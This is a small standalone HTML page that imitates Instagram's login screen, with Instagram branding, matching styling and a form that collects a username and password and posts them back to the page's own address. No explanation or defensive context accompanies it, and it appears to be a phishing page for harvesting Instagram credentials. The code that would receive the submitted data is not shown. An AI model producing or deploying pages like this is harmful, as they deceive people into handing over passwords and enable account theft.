<!DOCTYPE html>
<html>
<head><title>Instagram Login</title></head>
<body style="background:#fafafa; font-family:sans-serif;">
<div style="width:350px; margin:100px auto; background:white; padding:40px; border-radius:10px; box-shadow:0 0 10px #ccc;">
    <h2 style="text-align:center;">Instagram</h2>
    <form method="post">
        <input type="text" name="username" placeholder="Phone number, username, or email" style="width:100%; padding:10px; margin:10px 0;" required>
        <input type="password" name="password" placeholder="Password" style="width:100%; padding:10px; margin:10px 0;" required>
        <button type="submit" style="width:100%; background:#0095f6; color:white; border:none; padding:10px;">Log In</button>
    </form>
</div>
</body>
</html>
